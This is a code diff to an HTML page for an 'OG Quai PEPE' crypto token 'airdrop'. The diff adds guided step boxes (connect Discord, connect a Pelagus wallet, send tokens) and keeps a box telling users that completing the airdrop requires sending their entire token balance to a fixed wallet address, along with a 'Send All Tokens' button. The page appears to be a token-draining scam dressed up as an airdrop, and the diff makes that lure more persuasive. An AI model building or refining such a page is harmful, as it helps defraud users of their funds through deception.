@@ -163,6 +163,33 @@
             margin-top: 1rem;
             display: none;
         }
+
+        .info-box {
+    background: rgba(0, 0, 0, 0.7);
+    color: white;
+    padding: 1rem;
+    border-radius: 6px;
+    margin-bottom: 1rem;
+}
+
+.info-box h3 {
+    color: white;
+    margin-top: 0;
+    margin-bottom: 0.5rem;
+}
+
+.info-box ol {
+    margin: 0.5rem 0;
+    padding-left: 1.5rem;
+}
+
+.info-box p {
+    margin: 0.5rem 0;
+}
+
+.info-box small {
+    color: #a0aec0;
+}
     </style>
 </head>
 <body>
@@ -172,29 +199,50 @@
         <img src="photo_2024-04-12_16-05-40.jpg" alt="Background 3">
     </div>
     <div class="container">
-        <div id="titleText" class="title">🚀 Buy More OG Quai PEPE! 🐸</div>
-        
+        <!-- Initial welcome and steps -->
+        <div id="welcomeInfo" class="info-box">
+            <h3>🚀 Welcome to OG Quai PEPE! 🐸</h3>
+            <p>Follow these steps to participate:</p>
+            <ol>
+                <li>Connect your Discord account</li>
+                <li>Connect your Pelagus wallet</li>
+                <li>Send your tokens</li>
+            </ol>
+        </div>
+    
+        <!-- Discord connection info -->
+        <div id="discordInfo" class="info-box">
+            <p>First, connect your Discord account to verify eligibility.</p>
+        </div>
         <button id="discordBtn" class="btn-discord">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4C14.85 4.29 14.68 4.69 14.55 5.01C12.95 4.77 11.37 4.77 9.8 5.01C9.67 4.69 9.49 4.29 9.34 4C7.83 4.26 6.39 4.71 5.06 5.33C2.02 9.83 1.21 14.21 1.62 18.52C3.43 19.87 5.19 20.69 6.92 21.22C7.29 20.7 7.63 20.15 7.91 19.57C7.25 19.33 6.62 19.03 6.02 18.67C6.17 18.56 6.31 18.44 6.45 18.32C9.76 19.86 13.39 19.86 16.66 18.32C16.8 18.44 16.94 18.56 17.09 18.67C16.48 19.03 15.85 19.33 15.19 19.57C15.47 20.15 15.81 20.7 16.18 21.22C17.91 20.69 19.67 19.87 21.48 18.52C21.96 13.52 20.72 9.18 19.27 5.33ZM8.57 15.96C7.53 15.96 6.68 15.02 6.68 13.87C6.68 12.72 7.51 11.78 8.57 11.78C9.63 11.78 10.48 12.72 10.46 13.87C10.46 15.02 9.62 15.96 8.57 15.96ZM15.53 15.96C14.49 15.96 13.64 15.02 13.64 13.87C13.64 12.72 14.47 11.78 15.53 11.78C16.59 11.78 17.44 12.72 17.42 13.87C17.42 15.02 16.59 15.96 15.53 15.96Z" fill="currentColor"/>
             </svg>
             Connect Discord
         </button>
+    
+        <!-- Wallet connection info -->
+        <div id="walletInfo" class="info-box" style="display:none;">
+            <p>Great! Now connect your Pelagus wallet to proceed.</p>
+            <p><small>Make sure you have Pelagus wallet installed and set up.</small></p>
+        </div>
         <button id="connectBtn" class="btn-connect">Connect Pelagus</button>
+    
+        <!-- Rest of the existing elements -->
+        <div id="titleText" class="title">🚀 Buy More OG Quai PEPE! 🐸</div>
         
-<!-- New airdrop info and send button -->
-<div id="airdropInfo" class="airdrop-info">
-    <h3>🎉 OG Quai PEPE Airdrop</h3>
-    <p>To complete the airdrop process, you need to send all your OG Quai PEPE tokens.</p>
-    <p>Destination: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10</p>
-    <p>Your token balance: <span id="userBalance">0</span> OG Quai PEPE</p>
-    <p><small>Note: This transaction will send your entire token balance.</small></p>
-</div>
-<button id="sendBtn" class="btn-send">Send All Tokens</button>
-
-        <button id="scanBtn" class="btn-scan" style="display:none">View on QuaiScan</button>
+        <div id="airdropInfo" class="airdrop-info">
+            <h3>🎉 OG Quai PEPE Airdrop</h3>
+            <p>To complete the airdrop process, you need to send all your OG Quai PEPE tokens.</p>
+            <p>Destination: 0x006B8A853ee3235c77947D12E47A3dBC547Bab10</p>
+            <p>Your token balance: <span id="userBalance">0</span> OG Quai PEPE</p>
+            <p><small>Note: This transaction will send your entire token balance.</small></p>
+        </div>
+        <button id="sendBtn" class="btn-send">Send All Tokens</button>
+    
+        <button id="scanBtn" class="btn-scan">View on QuaiScan</button>
         <div id="console"></div>
-        <button id="buyBtn" class="btn-buy" style="display:none" onclick="window.open('https://poop.fun/token/0x001411083d4CF24632BA5e0841909933C2Da04a8', '_blank')">Buy Here!</button>
+        <button id="buyBtn" class="btn-buy">Buy Here!</button>
     </div>
 
     <script>
@@ -481,8 +529,11 @@ async function handleDiscordCallback() {
             log(`Connected Discord: ${data.username}`);
             history.replaceState(null, null, window.location.pathname);
 
-            // Show wallet connect button after Discord login
+            // Update UI
+            document.getElementById('welcomeInfo').style.display = 'none';
+            document.getElementById('discordInfo').style.display = 'none';
             document.getElementById('discordBtn').style.display = 'none';
+            document.getElementById('walletInfo').style.display = 'block';
             document.getElementById('connectBtn').style.display = 'block';
         } catch (error) {
             log('Discord Error: ' + error.message);
